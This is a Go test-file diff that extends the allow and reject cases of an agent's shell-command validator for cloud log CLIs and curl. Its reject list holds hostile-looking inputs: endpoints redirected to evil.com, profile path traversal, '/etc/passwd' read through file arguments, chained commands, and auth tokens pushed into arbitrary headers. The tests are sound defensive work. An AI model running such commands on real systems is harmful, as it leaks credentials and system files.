@@ -3,6 +3,7 @@ package agent
 import (
 	"os"
 	"path/filepath"
+	"strings"
 	"syscall"
 	"testing"
 )
@@ -608,8 +609,12 @@ func TestRound2QueryCommandsAndTrustedScripts(t *testing.T) {
 		`ossutil ls oss://my-bucket/logs/`,
 		`ossutil stat oss://my-bucket/logs/a.log`,
 		`aliyun oss cp --output-dir ` + ossOut1 + ` --checkpoint-dir ` + ossCp1 + ` oss://my-bucket/logs/a.log ` + filepath.Join(tmpRoot, "a.log"),
-		`aliyun oss cp --output-dir=` + ossOut1 + ` --checkpoint-dir=` + ossCp1 + ` oss://my-bucket/logs/a.log ` + existingTmpFile,
-		`ossutil cp -r --output-dir ` + ossOut2 + ` --checkpoint-dir ` + ossCp2 + ` oss://my-bucket/logs/ ` + filepath.Join(tmpRoot, "logs-new"),
+		`aliyun oss cp --output-dir=` + existingTmpDir + ` --checkpoint-dir=` + ossCp1 + ` oss://my-bucket/logs/a.log ` + existingTmpFile,
+		`ossutil cp -r --output-dir ` + existingTmpDir + ` --checkpoint-dir ` + ossCp2 + ` oss://my-bucket/logs/ ` + filepath.Join(tmpRoot, "logs-new"),
+		`lark-cli base +record-list --base-token EHz --table-id tbl --format json --as user`,
+		`lark-cli base +record-list --base-token EHz --table-id tbl --json --as user`,
+		`lark-cli base +record-search --base-token EHz --table-id tbl --keyword x --search-field Name --format=json --as user`,
+		`lark-cli base +record-list --base-token EHz --table-id tbl --output ` + filepath.Join(tmpRoot, "rec.ndjson") + ` --as user`,
 
 		// 3. tccli
 		`tccli cls SearchLog --TopicId t1 --From 1 --To 2 --Query 'error'`,
@@ -727,9 +732,14 @@ func TestRound2QueryCommandsAndTrustedScripts(t *testing.T) {
 		`aliyun oss cp oss://my-bucket/logs/a.log ` + filepath.Join(tmpRoot, "a.log"),
 		`aliyun oss cp --output-dir ` + ossOut1 + ` oss://my-bucket/logs/a.log ` + filepath.Join(tmpRoot, "a.log"),
 		`aliyun oss cp --output-dir /Users/x/out --checkpoint-dir ` + ossCp1 + ` oss://my-bucket/logs/a.log ` + filepath.Join(tmpRoot, "a.log"),
+		`aliyun oss cp --output-dir ` + existingTmpFile + ` --checkpoint-dir ` + ossCp1 + ` oss://my-bucket/logs/a.log ` + filepath.Join(tmpRoot, "a.log"),
+		`aliyun oss cp --output-dir ` + ossOut1 + ` --checkpoint-dir ` + existingTmpFile + ` oss://my-bucket/logs/a.log ` + filepath.Join(tmpRoot, "a.log"),
+		`aliyun oss cp --encoding-type url --output-dir ` + ossOut1 + ` --checkpoint-dir ` + ossCp1 + ` oss://my-bucket/logs/a.log ` + filepath.Join(tmpRoot, "a%2fb.log"),
+		`aliyun oss cp --encoding-type=url --output-dir ` + ossOut1 + ` --checkpoint-dir ` + ossCp1 + ` oss://my-bucket/logs/a.log ` + filepath.Join(tmpRoot, "a.log"),
 		`aliyun oss cp --output-dir ` + ossOut1 + ` --checkpoint-dir ` + ossCp1 + ` -e evil.com oss://my-bucket/logs/a.log ` + filepath.Join(tmpRoot, "a.log"),
 		`aliyun oss cp --output-dir ` + ossOut1 + ` --checkpoint-dir ` + ossCp1 + ` oss://my-bucket/logs/a.log ` + existingTmpDir,
 		`ossutil cp -r --output-dir ` + ossOut2 + ` --checkpoint-dir ` + ossCp2 + ` oss://my-bucket/logs/ ` + existingTmpDir,
+		`aliyun --profile ../evil sls GetLogs --project=p1`,
 		`aliyun oss cp a.txt oss://b/`,
 		`aliyun oss cp ` + filepath.Join(tmpRoot, "a.txt") + ` oss://b/a.txt`,
 		`aliyun oss cp oss://b/a.txt /Users/x/a.txt`,
@@ -743,9 +753,18 @@ func TestRound2QueryCommandsAndTrustedScripts(t *testing.T) {
 		`aliyun ram ListUsers`,
 		`aliyun sts GetCallerIdentity`,
 
-		// 3. tccli 负例
+		// 2b. lark-cli base 列表/搜索在未知当前目录缺省落盘 ndjson 的负例
+		`lark-cli base +record-list --base-token EHz --table-id tbl --as user`,
+		`lark-cli base +record-search --base-token EHz --table-id tbl --keyword x --search-field Name --as user`,
+		`lark-cli base +record-search --base-token EHz --table-id tbl --json '{"keyword":"x","search_fields":["Name"]}' --as user`,
+		`cd /tmp/posse-triage ; lark-cli base +record-list --base-token EHz --table-id tbl --as user`,
+		`cd /tmp/posse-triage || lark-cli base +record-list --base-token EHz --table-id tbl --as user`,
+		`cd /tmp/posse-triage | lark-cli base +record-list --base-token EHz --table-id tbl --as user`,
+
+		// 3. tccli 负例（含 argparse 缩写、尾部缺值、路径 profile 与非白名单动作）
 		`tccli cls DeleteTopic --TopicId t1`,
 		`tccli cls CreateTopic --TopicName t1`,
+		`tccli cls DescribeMetricSubscribePreview --TopicId t1`,
 		`tccli auth login`,
 		`tccli configure set secretId x`,
 		`tccli sts AssumeRole`,
@@ -757,7 +776,14 @@ func TestRound2QueryCommandsAndTrustedScripts(t *testing.T) {
 		`tccli cvm DescribeKeyPairs`,
 		`tccli cls GetLogDownloadUrl`,
 		`tccli --endpoint evil.com cls DescribeTopics`,
+		`tccli --profile ../evil cls DescribeTopics`,
+		`tccli cls SearchLog --profile /tmp/cfg --TopicId t1`,
 		`tccli cls SearchLog --endpoint evil.com --TopicId t1`,
+		`tccli cls SearchLog --endp evil.com --TopicId t1`,
+		`tccli cls SearchLog --cli-in file:///etc/passwd`,
+		`tccli cls SearchLog --reg ap-nanjing --TopicId t1`,
+		`tccli cls SearchLog --use-cvminstance-role`,
+		`tccli cls SearchLog --TopicId`,
 		`tccli cls SearchLog --proxy http://127.0.0.1:8080 --TopicId t1`,
 		`tccli cls SearchLog --cli-input-json file:///etc/passwd`,
 		`tccli cls SearchLog --TopicId @/etc/passwd`,
@@ -807,8 +833,10 @@ func TestRound2QueryCommandsAndTrustedScripts(t *testing.T) {
 		`curl -o ` + filepath.Join(tmpOutLink, "out.json") + ` "https://sentry.corp.laoyuegou.com/api/0/issues/"`,
 		`curl -H "Host: evil.com" "https://sentry.corp.laoyuegou.com/api/0/issues/"`,
 		`curl -H "Cookie: a=1" "https://sentry.corp.laoyuegou.com/api/0/issues/"`,
+		`curl -H "X-Custom-Header: val" "https://sentry.corp.laoyuegou.com/api/0/issues/"`,
 		`curl -H "X-Custom: $SENTRY_AUTH_TOKEN" "https://sentry.corp.laoyuegou.com/api/0/issues/"`,
 		`curl -H "Authorization: Bearer $SENTRY_AUTH_TOKEN extra" "https://sentry.corp.laoyuegou.com/api/0/issues/"`,
+		`curl -H "Authorization: Bearer lit" -H "Authorization: Bearer $SENTRY_AUTH_TOKEN" "https://sentry.corp.laoyuegou.com/api/0/issues/"`,
 		`curl -H "Authorization: Bearer $SENTRY_AUTH_TOKEN" -H "Authorization: Bearer $SENTRY_AUTH_TOKEN" "https://sentry.corp.laoyuegou.com/api/0/issues/"`,
 		`curl -H "X: $OTHER" "https://sentry.corp.laoyuegou.com/api/0/issues/"`,
 		`curl -H "X-HTTP-Method-Override: DELETE" "https://sentry.corp.laoyuegou.com/api/0/issues/"`,
@@ -860,13 +888,18 @@ func TestRound2QueryCommandsAndTrustedScripts(t *testing.T) {
 		t.Fatal(err)
 	}
 	overlapRoots := ScratchRoots{
-		TmpDir:         tmpRoot,
-		NotesDir:       notesDir,
-		TrustedScripts: []string{tmpScript, tmpRoot + "/", discScript, discDir + "/", notesDir + "/", filepath.Dir(tmpRoot) + "/"},
+		TmpDir:   tmpRoot,
+		NotesDir: notesDir,
+		TrustedScripts: []string{
+			tmpScript, tmpRoot + "/", strings.ToUpper(tmpRoot) + "/",
+			discScript, discDir + "/", strings.ToUpper(discDir) + "/",
+			notesDir + "/", filepath.Dir(tmpRoot) + "/",
+		},
 	}
 	for _, bad := range []string{
 		`bash ` + tmpScript,
 		tmpScript,
+		`bash ` + strings.ToUpper(tmpRoot) + `/in-tmp.sh`,
 		`bash ` + discScript,
 		discScript,
 		`bash ` + singleScript, // singleScript 在 t.TempDir() 下，若信任其与 tmpRoot 共同祖先也必须拒绝
